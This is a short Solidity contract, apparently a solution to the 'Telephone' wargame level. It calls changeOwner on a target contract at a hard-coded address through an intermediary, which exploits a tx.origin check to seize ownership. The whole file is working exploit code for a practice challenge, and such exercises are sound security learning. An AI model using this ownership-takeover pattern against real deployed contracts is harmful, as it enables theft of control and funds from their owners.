// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/math/SafeMath.sol";
import "./Telephone.sol";

contract TelephoneAttacker {
  using SafeMath for uint256;
  Telephone target = Telephone(0x3cBC99a8cfC61670075AD3d5155F29Cdd21777aF);

  function attack() public {
    target.changeOwner(msg.sender);
  }
}

